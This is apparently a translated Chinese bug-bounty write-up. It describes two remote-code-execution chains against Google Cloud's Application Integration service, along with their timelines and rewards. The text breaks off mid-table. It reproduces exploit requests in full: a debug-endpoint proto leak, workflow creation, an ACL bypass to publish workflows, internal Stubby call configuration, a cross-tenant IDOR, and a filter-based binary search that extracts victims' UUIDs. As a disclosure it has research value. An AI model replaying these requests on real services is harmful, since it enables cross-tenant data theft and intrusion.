#  StubZero：Google Cloud生产环境RCE漏洞，奖金148,337美元  
A译
                    A译  黑白之道   2026-05-24 23:55  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650617500&idx=1&sn=73c0634d23ef9a5a7ca009cf0e3b1929&scene=21#wechat_redirect)  
> **导语**  
：一个调试端点的信息泄露，最终演变为Google Cloud生产环境的完整远程代码执行攻击链。三天后，类似漏洞再次出现。这位研究员用两次报告、累计148,337美元的奖金，证明了Stubby RPC调用链在Google安全模型中的核心地位——以及一旦被攻破意味着什么。  
  
  
![StubZero：Google Cloud生产环境RCE漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6PFvmEcfvJSPsvQz4lTNJp9gNKeXyHyWIEJbqViaY95iaOjUQRwjAwxooKq6rhl9MBiaibD8Y63Radicx0Q3piae7A6twJXnuPeUm0Vw/640?wx_fmt=png "StubZero：Google Cloud生产环境RCE漏洞")  
## 一、起点：一个调试端点的信息泄露  
  
故事的起因，是研究员的一个自动化模糊测试工具对 API 端点 cloudcrmipfrontend-pa.googleapis.com  
 发出了警报——该 API 对若干可疑端点返回了 200 状态码。深入检查后发现，这个 API 存在多个公开的调试端点。  
  
进一步探测发现，/v1/integrationPlatform:getProtoDefinition  
 这个端点可以返回 Google 内部源代码仓库 google3 中任意 protobuf 消息的定义——甚至包括 YouTube 这类完全不相关的服务。  
  
**请求示例**  
：  
```
GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <已脱敏>Authorization: SAPISIDHASH <已脱敏>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
```  
  
**返回结果**  
（部分）：  
```
{  "protoDescriptor":{    "name":"InnerTubeContext",    "field":[      {        "name":"client",        "number":1,        "label":"LABEL_OPTIONAL",        "type":"TYPE_MESSAGE",        "typeName":".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo",        "jsonName":"client"      },      ...    ]}}
```  
  
这意味着：在Google这个黑盒目标上，几乎所有 API 的请求体/响应体结构都可以被枚举出来。这是一个巨大的信息泄露。  
## 二、"req2proto即服务"的诞生  
  
研究员之前曾开发过一个工具 req2proto，用于从请求体反推 protobuf 定义。但这个工具有局限性：只能找到请求体的 proto，无法获取响应体，且依赖 API 支持 JSPB（application/json+protobuf），而大多数 API 并不支持。  
  
现在，这个端点就是"req2proto即服务"（req2proto as a Service™）——一个托管版的 req2proto，功能强大得多。  
## 三、泄露内部工作流执行队列  
  
在没有查询参数的情况下，该端点只返回 INVALID_ARGUMENT 错误。根据以往经验，这类 filter 参数通常支持 AIP-160 规定的任意过滤语法。  
  
尝试 client_id>"123"  
 作为 filter：  
```
{  "error": {    "code": 500,    "message": "Failed to convert server response to JSON",    "status": "INTERNAL"  }}
```  
  
看起来后端给的响应没有 JSON 映射。Google API 支持通过标准参数 ?alt=  
 更改响应格式，?alt=proto  
 会返回 protobuf 格式的原始输出。  
  
由于使用的是 Google 自有的第一方认证（Cookie + Authorization header），请求必须发往 cloudcrmipfrontend-pa.clients6.google.com  
 而非 cloudcrmipfrontend-pa.googleapis.com  
，但 Google 不允许 raw proto 响应发往 *.google.com：  
```
Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com
```  
  
解决方法是使用请求头 X-Goog-Encode-Response-If-Executable: base64  
，将响应转为 base64 编码。  
  
通过 proto 定义泄露拿到的 schema，成功解码了返回的 protobuf，发现这是某种内部工作流执行队列，包含从 Spanner 同步数据到 Salesforce 的工作流：  
```
{  "queue_items":[    {      "queued_request":{        "queued_request_id":"75a885e2-c611-43f7-b4e2-ae0d87bae789",        "client_id":"default",        "workflow_name":"WriteToSfdc",        "priority":"CRITICAL",        "received_timestamp":1763057385562,        "event_execution_info_id":"615cd9a9-9c0e-46ec-90df-91ee42ec9c37"      },      ...      "type_url":"type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest",      "sfdc_object":{        "vector_account":{          "id":"001Kf00000wjeK3IAI",          "due_diligence__c":"Pending",          ...        }      }    }]}
```  
  
就在报告提交后几小时，该漏洞被标记为 **P0/S0**  
，并获得 🎉 Nice catch!。  
## 四、Stubby RPC与Google安全模型  
  
在深入分析前，需要理解 Google 的 RPC 基础设施。根据 Google SRE手册：  
> Google 所有服务都使用名为 Stubby 的远程过程调用（RPC）基础设施进行通信；开源版本 gRPC 已对外发布。  
  
  
Google 的安全模型中，每个 borglet 服务都有独立的身份。当你向 *.googleapis.com 端点发送请求时，前端服务使用自己的 prod 服务身份向后端服务发起 Stubby 调用，同时在安全票据中携带你的最终用户上下文。如果票据包含你的 Gaia 用户ID，后端服务会以该用户身份对请求进行授权。  
  
**关键安全机制**  
：  
```
Without authentication (anonymous)com.google.apps.framework.auth.IamPermissionDeniedException:  IAM authority does not have the permission 'cloudprivatecatalog.targets.get'  required for action PrivateCatalogV1Beta1-SearchProducts  on resource ''.  ...  Security Context:    ...    user = anonymous    creds = EndUserCreds    ...    peer =      protocol = loas      level = strong_privacy_and_integrity      host = jxcbu6.prod.google.com      role = cloud-commerce-catalog
```  
  
**含第一方认证时（Gaia用户）**  
：  
```
With first-party authentication (Gaia user)  ...  Security Context:    ...    user = gaiauser/0xaa22527678    creds = EndUserCreds    ...    gaiaId = 640201889743    security_realm = campus-dls
```  
  
注意 peer  
 块显示的是 prod 服务身份进行的内部 Stubby 调用。区别在于最终用户上下文：第一个票据是 ANONYMOUS，第二个携带 GAIA_MINT 凭证（当你使用 cookie 或 bearer 认证时，会被转换为标准 UberMint token）。  
  
如果攻击者能以集成平台的 prod 服务身份执行任意 Stubby 查询，就可以访问大量 RPC——从敏感用户数据到代码执行，取决于 prod 用户的权限范围。因此，Google 将此类漏洞视为远程代码执行。  
  
**Stubby访问控制机制**  
：  
  
Google 每个 Stubby 服务都定义了 RpcSecurityPolicy  
，包含按方法的允许列表。例如 Cloud SQL Speckle Boss 进程的策略：  
```
mapping {  rpc_method:"/SaasActuation.UpdateInstance"  rpc_method:"/MaintenancePolicyService.CreateMaintenancePolicy"  ...  authentication_policy {    creds_policy {      rules {        permissions:"auth.creds.useProdUserEUC"        action: ALLOW        in:"mdb:zamm-exe-3-cloud-sql--default-policy"        in:"user:speckle-tool-proxy@prod.google.com"      }      rules {        permissions:"auth.creds.useLOAS"        action: ALLOW        in:"allUsers"      }    }}  authorization_mode: MANUAL_IAM  permission_to_check:"cloudsql.instances.rollout"}
```  
- auth.creds.useLOAS  
 表示"任何 borglet 都可以用自己的 LOAS 身份调用"  
  
- auth.creds.useProdUserEUC  
 表示"只有特定的 MDB 组才能将 Gaia 最终用户身份转发到调用中"  
  
即便拿到了 Stubby 调用的原始能力，也不意味着能调用所有 RPC——只有那些 RpcSecurityPolicy 允许你的对等身份的 RPC 才能被访问。  
## 五、从信息泄露到RCE的完整攻击链  
### 5.1 创建工作流  
  
首次尝试创建工作流时收到 INVALID_ARGUMENT 错误：  
```
{  "error": {    "code": 400,    "message": "Request contains an invalid argument.",    "status": "INVALID_ARGUMENT"  }}
```  
  
推测是缺少必要参数，可能是 clientId  
。之前从 quota queue 泄露的响应中有 "client_id": "default"  
，于是尝试：  
```
{  "workflow":{    "name":"my-new-workflow-test",    "origin":"UI",    "clientId":"default",    "triggerConfigs":[],    "taskConfigs":[]},"isNewWorkflow":true}
```  
  
**成功**  
！返回了工作流ID。但要运行工作流，必须先发布它，而发布时遇到了权限限制：  
```
{  "error": {    "code": 403,    "message": "Publisher admin@gvrptest.cry.dev cannot be the same as the last editor...",    "status": "PERMISSION_DENIED"  }}
```  
  
需要另一个用户来发布。由于无法通过 ACL 端点添加其他账号，一度陷入僵局。  
### 5.2 Discord上的转机  
  
一个多月后，研究员在 Discord 群聊中半开玩笑地提到自己找到了一个 Google 内部泄露 protobuf 定义的漏洞。  
  
这时，一位名为 **shrugged**  
 的研究员回复说他们也在研究同一个 API，并且注意到了 GenericStubbyTypedTask  
 这个潜在 RCE 向量，但苦于没有有效的 client_id  
 来创建初始工作流草案。  
  
而研究员这边有 client_id: "default"  
，却在发布步骤卡住了。双方交换了各自的信息后，攻击链被迅速拼完。  
### 5.3 绕过修复：寻找对应的"替身"端点  
  
Google 已经根据初次报告部署了修复，所以很多原始端点都返回 PERMISSION_DENIED。但研究员注意到：很多端点在不同的服务名下存在 1:1 的"替身"：  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">原始端点（已修复）</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">替身端点</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">/v1/integrationPlatform:getProtoDefinition</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">/v1/integrationPlatform/workflowsupport:getProtoDefinition</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">/v1/integrationPlatform:runWorkflow</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">/v1/integrationPlatform/workflowexecution:runWorkflow</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">/v1/integrationPlatform:setAcl</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">/v1/integrationPlatform/auth:setAcl</span></section></td></tr></tbody></table>  
但 createDraftWorkflow  
 找不到替身，仍然返回 PERMISSION_DENIED。  
  
奇怪的是，shrugged 用同样的请求却能成功。答案揭晓：**修复没有完全同步到所有负载均衡的后端**  
。通过反复发送同一请求，可以可靠地路由到仍然允许该操作的后端。  
### 5.4 GenericStubbyTypedTaskV2的发现  
  
GenericStubbyTypedTask  
 这个任务名称实际上并不存在。从 /v1/integrationPlatform:listTaskEntities  
 返回的数据中只看到 IO_TEMPLATE  
 类型的任务。  
  
从 Application Integration 的 JS 代码中，找到了确切的任务名称：GenericStubbyTypedTaskV2  
，甚至配有独立的图标：  
```
["GenericStubbyTypedTaskV2","http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg"],
```  
  
尝试配置 GenericStubbyTypedTask  
 时收到错误，显示缺少必需字段 serverSpec  
：  
```
{  "error": {    "code": 400,    "message": "'Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.'",    "status": "INVALID_ARGUMENT"  }}
```  
  
逐一尝试后，确认了三个必需参数：serverSpec  
、serviceName  
 和 serviceMethod  
。参考 Ezequiel Pereira 的 protobuf 仓库，配合从另一个 discovery document 中泄露的 GSLB 地址，配置任务调用 gslb:alkali-base  
 上的 /ServerStatus.GetServices  
：  
```
{"workflow": {"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19", "name": "retest-test123", "taskConfigs": [{"taskName": "GenericStubbyTypedTaskV2", "taskNumber": "1", "parameters": {"response": {"key": "response", "value": {"stringValue": "$response$"}, "dataType": "STRING_VALUE"}, "serverSpec": {"key": "serverSpec", "value": {"stringValue": "gslb:alkali-base"}, "dataType": "STRING_VALUE"}, "serviceName": {"key": "serviceName", "value": {"stringValue": "ServerStatus"}, "dataType": "STRING_VALUE"}, "serviceMethod": {"key": "serviceMethod", "value": {"stringValue": "GetServices"}, "dataType": "STRING_VALUE"}}, ...}], ...}
```  
  
**成功**  
！返回了 Alkali 内部框架的服务列表：  
```
{  "protoValue":{    "@type":"type.googleapis.com/rpc.ServiceList",    "service":[      {        "name":"AlkaliBaseAccountService",        "descriptor":{          "filename":"google/internal/alkali/base/v1/alkali_base_account_service.proto",          "method":[            {              "name":"ListAccounts",              "argumentType":"google.internal.alkali.base.v1.ListAccountsRequest",              "resultType":"google.internal.alkali.base.v1.ListAccountsResponse",              ...            }          ]        }      }    ]}}
```  
### 5.5 绕过发布权限检查  
  
之前 ACL 问题导致无法发布。shrugged 发现可以通过更新 IP_EVENTBUS_WORKFLOWS 的 ACL，使用两个攻击者控制的 Google 账户的混淆 Gaia ID 来绕过：  
```
{  "resourceInfo":{    "resource":"IP_EVENTBUS_WORKFLOWS",    "id":"retest-test123"},"acl":{    "entries":[      {"scope":{"obfuscatedGaiaId":"100029910836469267942"},"role":105},      {"scope":{"obfuscatedGaiaId":"113728935872649341310"},"role":105}    ]}}
```  
  
第一步，使用第一个攻击者 Google 账户切换发布请求状态：  
```
POST /v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow{"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}
```  
  
第二步，使用第二个攻击者账户最终发布工作流：  
```
POST /v1/integrationPlatform/workflowdeployment:publishWorkflow{"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}
```  
  
**RCE 攻击链完成**  
。  
### 5.6 时间线（第一次RCE）  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">日期</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2025-12-01</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">初次报告发送给 Google</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2025-12-01</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Google 将报告标记为 P0/S0</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2025-12-01</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">🎉 Nice catch!</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-01-12</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">向 Google 安全团队告知 RCE 升级</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-01-12</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">附带 RCE PoC 更新报告</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-01-12</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Google 提升报告级别</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-01-16</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">评审团颁发 </span><strong><span leaf="">$60,000</span></strong><span leaf="">。理由：报告质量卓越，漏洞类别为&#34;Google Cloud 生产环境渗透&#34;，属于无受害者交互的漏洞，默认 Google Cloud 产品</span></section></td></tr></tbody></table>## 六、三个月后：第二次RCE  
  
你以为故事结束了？没那么简单。三个月后，自动化模糊测试工具再次发来警报——这次是公开的 Application Integration 产品 API 中存在多个 IDOR（不安全直接对象引用）。  
### 6.1 跨租户IDOR漏洞  
  
整个 API 中，可以用自己项目 ID 作为 URL，但引用其他人的 UUID：  
```
GET /v1/projects/<your-project>/locations/us-central1/integrations/anythinghere/versions/<victim-uuid>Host: integrations.googleapis.comAuthorization: Bearer <redacted>
```  
  
API 会愉快地返回受害者的资源，因为认证检查是对项目 ID 做的（你对自己的项目有权限），但没有检查该 ID 是否实际绑定到你的项目。  
  
但这个漏洞本身影响有限，因为使用的是 UUIDv4，搜索空间达到 10^36 量级，无法有效暴力枚举。需要找到一种方法泄露受害者的资源 UUID。  
### 6.2 测试用例功能的跨项目泄露  
  
研究员发现了一个"测试用例"功能。当你查看测试用例在浏览器中的加载方式时，浏览器发送的请求类似：  
```
POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCasesHost: us-central1-integrations.clients6.google.comContent-Type: application/x-protobuf
```  
  
解码后的请求 payload：  
```
{  "1": "projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4",  "2": "workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4",  "6": {"1": ["name", "display_name", "update_time", "client_id"]}}
```  
  
字段1是父资源（我的项目，我的版本 UUID），字段6是响应字段掩码，字段2是某种 filter。如果省略字段2和6呢？返回了来自**所有其他 GCP 项目**  
的测试用例！  
```
{  "testCases":[    {      "name":"projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3",      "displayName":"test",      "triggerId":"api_trigger/AI_bebbia_CreateWOSubs_API_1",      "creatorEmail":"redacted@google.com",      ...    }]}
```  
  
注意，每个结果的 versions/...  
 段都是同一个 UUID：631a0566-02fc-4dce-b319-25e2c68168f4  
——这是研究员自己的版本 UUID。API 只是把它原样反射回每个测试用例的 name 中，即使这些测试用例属于完全不同的项目和集成。  
  
虽然现在有了所有 GCP 项目中的每个测试用例 ID，连同集成名称和创建者邮箱，但实际需要的受害者版本 UUID 并不在响应中。  
### 6.3 二进制搜索提取UUID  
  
但测试用例 ID 本身已经足够造成真实影响了。Application Integration 暴露了一个 :executeTest  
 端点，可以通过测试用例 ID 执行任意测试用例，而**不需要受害者的真实版本 UUID**  
。  
```
POST /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTestHost: integrations.googleapis.comAuthorization: Bearer <redacted>Content-Length: 0
```  
  
真正的目标是利用 IDOR 访问受害者的完整集成，需要真实的版本 UUID。  
  
灵光一现：filter 参数（字段2）支持比较运算符如 =  
。如果也支持 >  
 和 <=  
 呢？可以锚定一个已知的测试用例 ID，然后对 workflow_id  
 字段逐个十六进制字符进行二进制搜索，直到重建完整 UUID：  
```
id = "<known-tc-uuid>" AND workflow_id > "<low>" AND workflow_id <= "<high>"
```  
  
用 Claude 写了一个 PoC，一次成功：  
```
$ python extract_by_id.py --token "<redacted>" --project 273897706296 --location "us-central1" --tc-id "60413427-4d07-4c36-bce0-66cfcdd81879"Test case: 60413427-4d07-4c36-bce0-66cfcdd81879Parent: projects/273897706296/locations/us-central1/integrations/x/versions/-Verified: target found. Starting binary search... [ 4/32] fb1d0000-0000-0000-0000-000000000000 (16 reqs) [ 8/32] fb1dc5f3-0000-0000-0000-000000000000 (32 reqs) [12/32] fb1dc5f3-0380-0000-0000-000000000000 (48 reqs) [16/32] fb1dc5f3-0380-491c-0000-000000000000 (64 reqs) [20/32] fb1dc5f3-0380-491c-af90-000000000000 (80 reqs) [24/32] fb1dc5f3-0380-491c-af90-5a1400000000 (96 reqs) [28/32] fb1dc5f3-0380-491c-af90-5a141aa00000 (112 reqs) [32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56 (128 reqs)workflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56Total requests: 128
```  
  
现在拿到了受害者的实际集成版本 UUID。将它链接到 GetIntegrationVersion  
 IDOR：  
```
GET /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56Host: integrations.googleapis.comAuthorization: Bearer <redacted>
```  
  
返回了属于不同项目的完整集成，包括每个触发器配置、任务配置、参数绑定和创建者邮箱：  
```
{  "name":"projects/<your-project>/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56","state":"DRAFT","triggerConfigs":[    {      "label":"API Trigger",      "triggerType":"API",      "triggerId":"api_trigger/TestCasePOC5_API_1"    }],"taskConfigs":[    {      "task":"GenericRestV2Task",      "displayName":"Call REST Endpoint",      "parameters":{        "url":{"key":"url","value":{"stringValue":"$url$"}},        "httpMethod":{"key":"httpMethod","value":{"stringValue":"POST"}},        "authConfigName":{"key":"authConfigName","value":{"stringValue":"authprofiletest"}}      }    }],"integrationParameters":[    {"key":"url","dataType":"STRING_VALUE","defaultValue":{"stringValue":"https://example.com"}}],"lastModifierEmail":"gvrptest4@gmail.com","createTime":"2026-03-22T11:10:30.087Z"}
```  
  
从之前测试用例泄露的数据中，大量 creatorEmail  
 字段以 @google.com  
 结尾。这意味着很多 Google 内部团队也在这个平台上运行自己的集成。如果其中一些内部集成已经配置了 GenericStubbyTypedTaskV2  
（或其他内部专用任务如 PythonTask、CreateBuganizerIssueTask 等），这条跨租户攻击链的影响将变得更加严重。  
### 6.4 配置内部任务类型  
  
研究员尝试创建一个包含内部任务类型的集成：  
```
POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versionsHost: integrations.googleapis.comAuthorization: Bearer <redacted>
```  
```
{  "taskConfigsInternal":[    {      "taskNumber":"1",      "taskName":"PythonTask",      ...      "taskEntity":{        "uiConfig":{          "taskUiModuleConfigs":[            {              "moduleId":"RPC_TYPED"            }          ]        }      },      "taskType":"ASIS_TEMPLATE",      ...    }],  ...}
```  
  
**创建居然成功了**  
。但执行工作流时超时：  
```
Execution timeout, cancelled graph execution. The default timeout is 2min for sync execution...
```  
  
但有趣的是，配置 PythonTask 后，创建测试用例并执行测试用例时，收到了一个可疑的错误：  
```
{  "1": 9,  "2": "java.io.IOException: No space left on device"}
```  
  
这是来自执行后端的真实异常，不是超时。测试用例功能运行的代码路径足够深入，可以因实际的磁盘 I/O 失败而崩溃。用 GenericStubbyTypedTaskV2  
 做同样的尝试，得到了同样可疑但不太有用的响应：  
```
Failed to execute test case. Error: Unknown Error.
```  
  
检查工作流执行日志时，真正的错误浮出水面：  
```
{  "message": "com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w",  "code": 500}
```  
  
这非常可疑。通过以下方式可以拉取完整的堆栈跟踪：  
```
GET /v1/projects/<project>/locations/us-west1/integrations/ExampleTest1234:1/executions/id:downloadHost: integrations.googleapis.com
```  
  
堆栈跟踪清楚地表明，变量被直接插入到后端的 ExecuteStubbyCallRequest  
 中。根据堆栈跟踪推测，后端代码大致如下：  
```
GenericStubbyTypedTaskV2.buildRequest():  line 219: setServerAddress(serverSpec) → ExecuteStubbyCallRequest.java:1123  line 220: setServiceName(serviceName) → ExecuteStubbyCallRequest.java:1219  line 221: setMethodName(serviceMethod) → ExecuteStubbyCallRequest.java:1313  ...
```  
### 6.5 时间线（第二次RCE）  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">日期</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-03-21</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">初次报告发送给 Google</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-03-23</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Google 将报告标记为 P1/S1</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-03-23</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">向 Google 安全团队告知 RCE 升级</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-03-23</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">🎉 Nice catch!，报告更新为 P0/S0</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-04-28</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">评审团颁发 </span><strong><span leaf="">$75,000</span></strong><span leaf="">。理由：漏洞类别为&#34;Google Cloud 生产环境渗透&#34;，无受害者交互的漏洞，默认 Google Cloud 产品</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-05-06</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">告知 Google 的 GetIntegrationVersion RPC 仍然存在漏洞</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-05-08</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">评审团颁发额外 </span><strong><span leaf="">$13,337</span></strong><span leaf="">。理由：漏洞类别为&#34;单服务权限提升 - 写入&#34;，无受害者交互的漏洞，默认 Google Cloud 产品</span></section></td></tr></tbody></table>## 七、漏洞奖金结构解析  
  
根据 Google Cloud VRP 表格，基础 RCE 奖金大致分为三个档次：  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">档次</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">描述</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">基础奖金</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">第一档</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">权限相对较低的生产用户访问</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">$50,000</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">第二档</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">权限较高的生产用户访问</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">$75,000</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">第三档</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Google 